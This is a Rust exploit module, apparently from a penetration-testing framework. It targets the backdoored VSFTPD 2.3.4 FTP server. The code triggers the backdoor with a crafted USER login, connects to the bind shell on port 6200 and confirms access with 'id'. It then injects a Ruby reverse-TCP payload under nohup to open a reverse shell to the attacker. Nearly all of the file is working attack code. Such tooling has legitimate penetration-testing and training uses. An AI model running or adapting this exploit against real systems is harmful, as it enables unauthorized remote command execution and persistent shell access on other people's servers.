use crate::{
    core::{
        exploit::{remote_tcp::RemoteTcp, Exploit, Info, Kind, Ranking},
        opt::Opt,
        payload::Payload,
    },
    module::payload::ruby_reverse_tcp::RubyReverseTcp,
    util::gen::random_alphanumeric,
};
use log::info;
use std::{
    error::Error,
    io::{Read, Write},
    net::TcpStream,
    time::Duration,
};

pub struct Vsftpd234Backdoor {
    pub remote_tcp: RemoteTcp,
    pub backdoor_port: Option<String>,
}

impl Vsftpd234Backdoor {
    // TODO: When exploit is being used by CLI interaction, can get RHOST and RPORT there and pass it in
    pub fn new(remote_tcp: RemoteTcp, backdoor_port: Option<String>) -> Vsftpd234Backdoor {
        Vsftpd234Backdoor {
            remote_tcp,
            backdoor_port,
        }
    }

    fn handle_backdoor(&self, mut stream: TcpStream) -> Result<(), Box<dyn Error>> {
        stream.write("id\n".as_bytes())?;

        let mut backdoor_resp = String::new();
        stream.read_to_string(&mut backdoor_resp)?;

        if !backdoor_resp.contains("uid=") {
            return Err("The backdoor port seems to not be a shell".into());
        }
        info!(
            "Received successful backdoor UID response: {}",
            backdoor_resp.trim()
        );

        // TODO: so right now the payload is just hardcoded, need a way to set it dynamically
        info!("Starting generic revshell on port 9090");
        let payload = RubyReverseTcp::default();
        payload.pretask()?;
        stream.write(format!("nohup {} >/dev/null 2>&1", payload.blob_to_string()?).as_bytes())?;

        Ok(())
    }
}

impl Exploit for Vsftpd234Backdoor {
    fn default() -> Self {
        Vsftpd234Backdoor {
            remote_tcp: RemoteTcp {
                rhost: "".to_string(),
                rport: "".to_string(),
                read_timeout: Some(Duration::from_secs(60)),
                write_timeout: Some(Duration::from_secs(60)),
            },
            backdoor_port: None,
        }
    }

    fn kind(&self) -> Kind {
        Kind::Remote
    }

    fn ranking(&self) -> Ranking {
        Ranking::Excellent
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
            module_path: "exploit/ftp/vsftpd_234_backdoor".to_string(),
            disclosure_date: "2011-07-03".to_string(),
            ranking: self.ranking().to_string(),
            kind: self.kind().to_string(),
            description:
                "This module exploits a malicious backdoor that was added to the VSFTPD download \
        archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between \
        June 30th 2011 and July 1st 2011 according to the most recent information \
        available. This backdoor was removed on July 3rd 2011."
                    .to_string(),
            license: None,
            author: Some(vec!["hdm".to_string(), "MC".to_string()]),
            references: None,
            platform: Some(vec!["unix".to_string()]),
        }
    }

    fn exploit(&self) -> Result<(), Box<dyn std::error::Error>> {
        let backdoor_port = match &self.backdoor_port {
            Some(backdoor_port) => backdoor_port,
            None => "6200",
        };
        info!("Attempting to access backdoor on port {}", backdoor_port);
        match self
            .remote_tcp
            .custom_connect(&self.remote_tcp.rhost, backdoor_port)
        {
            Ok(stream) => {
                info!(
                    "Port {} used by the backdoor bind listener is already open",
                    backdoor_port
                );
                self.handle_backdoor(stream)?;
                return Ok(());
            }
            Err(e) => info!(
                "Port {} used by backdoor bind listener is not already open: {}",
                backdoor_port, e
            ),
        };

        let mut stream = self.remote_tcp.connect()?;

        let mut banner_resp = String::new();
        stream.read_to_string(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream.read_to_string(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }

        stream.write(format!("PASS {}\r\n", user_hash).as_bytes())?;
        // Server responds here, not necessary to check as backdoor port should now be open

        self.handle_backdoor(stream)?;
        Ok(())
    }

    fn opts(&self) -> Vec<Opt> {
        let mut opts: Vec<Opt> = Vec::new();

        let mut remote_tcp_opts = RemoteTcp::opts();
        opts.append(&mut remote_tcp_opts);

        opts.push(Opt {
            name: "BACKDOOR_PORT".to_string(),
            description: "Backdoor port that the vulnerable VSFTPD server can open".to_string(),
            default_value: Some("6200".to_string()),
            value: Some("6200".to_string()),
        });

        opts
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>> {
        for opt in opts {
            match opt.name.as_str() {
                "BACKDOOR_PORT" => self.backdoor_port = opt.value,
                // TODO: Need solution so code below is not duplicated for another module which uses RemoteTcp
                "RHOST" => self.remote_tcp.rhost = opt.value.ok_or("RHOST option is required")?,
                "RPORT" => self.remote_tcp.rport = opt.value.ok_or("RPORT option is required")?,
                "READ_TIMEOUT" => {
                    self.remote_tcp.read_timeout = opt
                        .value
                        .and_then(|value| value.parse::<u64>().ok().map(Duration::from_secs))
                }
                "WRITE_TIMEOUT" => {
                    self.remote_tcp.write_timeout = opt
                        .value
                        .and_then(|value| value.parse::<u64>().ok().map(Duration::from_secs))
                }
                _ => info!("Unknown option name {} was provided", opt.name),
            }
        }
        Ok(())
    }
}
